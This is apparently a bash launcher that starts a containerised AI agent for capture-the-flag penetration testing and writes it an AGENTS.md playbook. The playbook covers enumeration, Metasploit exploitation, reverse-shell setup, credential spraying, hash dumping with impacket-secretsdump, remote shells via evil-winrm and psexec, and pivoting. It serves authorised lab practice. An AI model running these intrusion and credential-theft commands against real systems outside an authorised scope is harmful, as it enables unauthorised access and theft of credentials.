#!/usr/bin/env bash
set -eo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
IMAGE_NAME="opencode-halogen-hacker"
CONTAINERFILE="$SCRIPT_DIR/Containerfile.openCode-halogen-hacker"
CONTAINER_NAME="opencode-halogen-hacker"
PG_VOLUME="halogen-pentest-pgdata"

REBUILD=0
CLEAN=0
TARGET_DIR=""
HALOGEN_URL="${HALOGEN_URL:-http://host.containers.internal:8731/v1}"

while [[ $# -gt 0 ]]; do
    case $1 in
        -r|--rebuild)   REBUILD=1; shift ;;
        -c|--clean)     CLEAN=1; shift ;;
        --halogen)      HALOGEN_URL="$2"; shift 2 ;;
        --halogen=*)    HALOGEN_URL="${1#*=}"; shift ;;
        *)              TARGET_DIR="$1"; shift ;;
    esac
done

if ! command -v podman >/dev/null 2>&1; then
    echo "[-] podman not found on PATH."; exit 1
fi

if [ $REBUILD -eq 1 ]; then
    echo "[*] Explicit rebuild requested."
    echo "[*] Building $IMAGE_NAME from $CONTAINERFILE..."
    podman build --no-cache -t "$IMAGE_NAME" -f "$CONTAINERFILE" "$SCRIPT_DIR" 2>&1 | tee build.log
    echo "[+] Image $IMAGE_NAME built. Exiting without launching."
    exit 0
fi

# --- Handle --clean before image check — cleaning doesn't need the image ---
[ -z "$TARGET_DIR" ] && TARGET_DIR=$(pwd)
TARGET_DIR=$(readlink -f "$TARGET_DIR")

if [ $CLEAN -eq 1 ]; then
    echo "[*] --clean requested. Wiping state for a fresh challenge."

    # Wipe workspace contents on the host side
    if [ -d "$TARGET_DIR" ]; then
        echo "[*] Cleaning $TARGET_DIR..."
        find "$TARGET_DIR" -mindepth 1 -maxdepth 1 -exec rm -rf {} + 2>/dev/null || true
        echo "[+] Workspace cleaned."
    fi

    # Destroy and recreate the PG volume so the MSF database starts fresh
    echo "[*] Destroying PostgreSQL volume ($PG_VOLUME)..."
    podman volume rm -f "$PG_VOLUME" >/dev/null 2>&1 || true
    echo "[+] Volume removed. A fresh volume will be created on launch."
    echo ""
    echo "[+] Clean complete. Run without --clean to start a fresh session."
    exit 0
fi

if [ -z "$(podman images -q "$IMAGE_NAME" 2>/dev/null)" ]; then
    echo "[*] Image $IMAGE_NAME not found. Running initial build..."
    podman build -t "$IMAGE_NAME" -f "$CONTAINERFILE" "$SCRIPT_DIR" 2>&1 | tee build.log
fi

# --- Generate AGENTS.md dynamically ---
AGENTS_FILE="$TARGET_DIR/AGENTS.md"
if [ ! -f "$AGENTS_FILE" ]; then
    echo "[*] Generating default AGENTS.md in $TARGET_DIR..."
    cat << 'AGENTSEOF' > "$AGENTS_FILE"
# Pentesting Agent Instructions

## Methodology: Enumerate → Research → Exploit

Follow this loop for every target. Do NOT skip to web searches or walkthroughs.

### 1. Enumerate the target
Discover open ports, services, and version strings:
```bash
safe-run nmap -sCV -Pn -oA /workspace/loot/initial <TARGET>
```
Record every service name and version number you find (e.g. `Apache 2.4.49`,
`OpenSSH 8.2p1`, `ProFTPD 1.3.5`, `Rejetto HFS 2.3`).

### 2. Search for known exploits LOCALLY FIRST
For every identified service+version, search the local exploit database and
Metasploit **before** doing anything else:
```bash
safe-run searchsploit <service> <version>          # ExploitDB local mirror
safe-run searchsploit -x <edb-id>                  # read the exploit source
```
```
search_exploits("<service> <version>")              # Metasploit MCP tool
search_modules("<service>")                         # broader MSF search
```
```bash
safe-run netexec smb <TARGET> --gen-relay-list /workspace/loot/relay.txt  # AD targets
```
Also check for CVEs directly:
```bash
safe-run searchsploit -cve <CVE-YYYY-NNNNN>        # if you know a CVE number
safe-run nuclei -u <TARGET> -as                     # auto-detect tech + scan
```

### 3. Attempt exploitation
Try the most promising exploit. If it fails, go back to step 2 with different
search terms (product name, protocol, vulnerability class).

### 4. Only THEN go external
If local searches produce nothing after genuine effort:
*   Search the web for `<service> <version> CVE` or `<service> <version> exploit`.
*   **Never search for a walkthrough or writeup of the challenge itself.**
    Searching for `"<box name>" walkthrough` or `"<box name>" writeup` is
    cheating and defeats the purpose.

### Why this matters
*   `searchsploit` and Metasploit contain thousands of ready-to-use exploits
    with no internet round-trip. They are faster and more reliable than web
    searches.
*   Web searches for challenge names return spoilers, not skills. The goal is
    to practice the methodology, not to find the answer.

---

## Metasploit Execution Preference
The Metasploit MCP server's parameter parsing can occasionally be strict. For complex exploitation chains:
1. Do not use the `run_module` MCP tool iteratively.
2. Instead, write your commands to a `.rc` resource script in the `/workspace` directory.
3. Execute the script directly using the terminal via `safe-run msfconsole -q -r your_script.rc`.

## Networking Constraints
*   **Target Scoping:** You are restricted by the `scope.txt` file. Only attack IPs explicitly listed there.
*   **Reverse Shells:** When setting an `LHOST` for a reverse shell payload, you must use the host's VPN IP. Do not use the internal `10.88.x.x` container IP.
*   **Listeners:** Always bind your `LPORT` to a port between `4444` and `4450`, as these are explicitly forwarded through the container NAT.

## Output Handling
*   Save all loot, hashes, and flags to `/workspace/loot/`.

## Cleanup Between Challenges
Run `cleanup -f` inside the container to wipe all workspace data and reset the MSF database.
From the host, launch with `--clean` to destroy the workspace and PG volume before starting.

---

## Windows Target Playbook (Credential-Based Access)

When you obtain valid Windows credentials, use this priority order. Each method is
faster and more reliable than RDP. **Only fall back to RDP if all text-based methods fail
or the challenge explicitly requires GUI interaction.**

### 1. Evil-WinRM (preferred for WinRM / port 5985-5986)
```bash
safe-run evil-winrm -i <TARGET> -u <USER> -p '<PASS>'
```
*   Full PowerShell session. Upload/download files. Load scripts.
*   If the port is open, try this first.

### 2. Impacket psexec / wmiexec / smbexec (SMB-based shells)
```bash
safe-run impacket-psexec '<DOMAIN>/<USER>:<PASS>@<TARGET>'
safe-run impacket-wmiexec '<DOMAIN>/<USER>:<PASS>@<TARGET>'
safe-run impacket-smbexec '<DOMAIN>/<USER>:<PASS>@<TARGET>'
```
*   Semi-interactive SYSTEM shells. Good for quick flag grabs on the Administrator desktop.
*   `wmiexec` is stealthier; `psexec` gives SYSTEM; `smbexec` works when psexec is blocked.

### 3. Impacket secretsdump (hash dumping without a shell)
```bash
safe-run impacket-secretsdump '<DOMAIN>/<USER>:<PASS>@<TARGET>'
```
*   Dumps SAM/LSA/NTDS. Often all you need for a flag hidden in credential stores.

### 4. NetExec (quick credential validation + enumeration)
```bash
safe-run netexec smb <TARGET> -u <USER> -p '<PASS>'
safe-run netexec winrm <TARGET> -u <USER> -p '<PASS>'
safe-run netexec rdp <TARGET> -u <USER> -p '<PASS>'
```
*   Fast spray: test creds across protocols in seconds.
*   Add `--shares` / `--users` / `--rid-brute` for quick enumeration.
*   Tells you instantly if WinRM is available (look for `Pwn3d!`).

### 5. SMB file access (grab flags from shares directly)
```bash
safe-run smbclient '//<TARGET>/C$' -U '<DOMAIN>/<USER>%<PASS>'
```
*   If you know the flag path (e.g. `C:\Users\Administrator\Desktop\root.txt`),
    just `get` it. No shell needed.

---

## RDP Playbook (GUI-Required Challenges Only)

**Use RDP only when the challenge requires graphical interaction** — a desktop app,
a browser-based step, or a GUI-only tool. For everything else, use the text-based
methods above.

### Quick-Start Commands
These wrapper scripts handle Xvfb, xfreerdp, and xdotool for you:

```bash
# Connect (starts Xvfb automatically)
rdp-connect <TARGET_IP> <USER> '<PASS>'           # default 1024x768
rdp-connect <TARGET_IP> <USER> '<PASS>' 1280x720  # custom resolution

# Take a screenshot
rdp-screenshot            # saves PNG to /workspace/loot/screenshots/
rdp-screenshot --ocr      # saves PNG + runs tesseract OCR, prints text

# Send keystrokes
rdp-type "whoami"                 # types text literally
rdp-type --cmd "whoami"           # types text + presses Enter
rdp-type --key Return             # sends a single key
rdp-type --key super              # opens Start menu
rdp-type --key ctrl+l             # focus browser address bar

# Disconnect and tear down
rdp-disconnect
```

### Performance Rules
1.  **Resolution:** Use 1024x768 or 1280x720. Larger wastes bandwidth and OCR time.
2.  **Color depth:** The wrapper uses `/bpp:16` and disables wallpaper/themes/animations. Do not override these.
3.  **Batch your actions:** Plan a full sequence of keystrokes before sending. Do NOT
    screenshot-type-screenshot in a tight loop. Instead:
    *   Type the full command sequence.
    *   Wait 2-3 seconds for execution.
    *   Take ONE screenshot to verify the result.
4.  **OCR budget:** Each `rdp-screenshot --ocr` call costs ~2-3 seconds. Minimize calls.
    If you need to read a small area, crop the screenshot with `convert` before OCR:
    ```bash
    convert /workspace/loot/screenshots/rdp-LATEST.png -crop 600x200+100+300 /tmp/crop.png
    tesseract /tmp/crop.png /tmp/crop --psm 6
    cat /tmp/crop.txt
    ```
5.  **Window focus:** If keystrokes aren't landing, refocus:
    ```bash
    DISPLAY=:99 wmctrl -a "FreeRDP"   # or the window title
    ```
6.  **Timeouts:** RDP sessions on HTB/THM boxes are unstable. If xfreerdp3 dies,
    just re-run `rdp-connect`. The Xvfb display persists.

### Opening Applications via RDP
When you need to launch a GUI application:
```bash
# Open Start Menu → type app name → Enter
rdp-type --key super
sleep 1
rdp-type --cmd "cmd"          # or "powershell", "notepad", app name
sleep 2
rdp-screenshot --ocr          # verify it opened
```

For browser-based tasks:
```bash
rdp-type --key super
sleep 1
rdp-type --cmd "msedge"       # or "firefox", "chrome"
sleep 3
rdp-type --key ctrl+l         # focus address bar
rdp-type --cmd "http://target-url:8080/path"
sleep 3
rdp-screenshot --ocr
```

### When to Abandon RDP
If you have spent more than **5 minutes** fighting RDP (connection drops, black screens,
keystrokes not registering), step back and try:
*   `evil-winrm` — might the "GUI app" actually have a CLI equivalent?
*   `impacket-wmiexec` — can you run the same command remotely?
*   `smbclient` — is the flag just a file you can grab over SMB?
*   Port forward the target's service to localhost and interact from the container.

---

## Pivoting and Tunneling
*   **Chisel:** `/usr/local/bin/chisel` — TCP/UDP tunnel over HTTP.
*   **Ligolo-ng:** `/usr/local/bin/ligolo-proxy` — full VPN-style pivot.
*   **Proxychains:** `proxychains4 <command>` — route tools through SOCKS proxy.
*   **SSH tunnels:** `ssh -D 1080 user@target` for dynamic SOCKS, `-L` for local port forwards.
*   **socat:** Relay/redirect any TCP/UDP stream.
AGENTSEOF
fi
# --------------------------------------

echo "[*] Launching OpenCode environment in $TARGET_DIR..."

podman volume create "$PG_VOLUME" >/dev/null 2>&1 || true
podman rm -f "$CONTAINER_NAME" >/dev/null 2>&1 || true

# Run container with explicit networking capabilities and open ports for callbacks
exec podman run -it --rm \
    --name "$CONTAINER_NAME" \
    --cap-add=NET_RAW \
    --cap-add=NET_ADMIN \
    -p 4444-4450:4444-4450 \
    -e HALOGEN_URL="$HALOGEN_URL" \
    -v "$TARGET_DIR:/workspace:Z" \
    -v "$PG_VOLUME:/var/lib/postgresql:Z" \
    "$IMAGE_NAME" /usr/local/bin/opencode-select
